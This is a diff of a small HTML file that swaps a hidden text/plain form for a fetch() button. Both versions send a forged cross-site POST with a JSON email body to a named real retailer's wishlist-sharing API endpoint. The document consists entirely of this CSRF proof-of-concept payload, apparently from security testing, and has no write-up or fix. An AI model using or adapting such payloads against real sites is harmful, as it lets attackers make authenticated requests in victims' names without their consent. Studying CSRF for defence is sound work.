@@ -1,27 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>JSON CSRF Test</title>
-</head>
-<body>
-
-<h2>JSON CSRF Test (text/plain)</h2>
-
-<form
-    action="https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR"
-    method="POST"
-    enctype="text/plain">
-
-    <input
-        type="hidden"
-        name='{"email":"testerr0092@gmail.com"}'
-        value=""
-    />
-
-    <button type="submit">
-        Submit Request
-    </button>
-</form>
-
-</body>
-</html>
+<button onclick='fetch("https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:`{"email":"testerr0092@gmail.com"}`})'>
+    Submit
+</button>
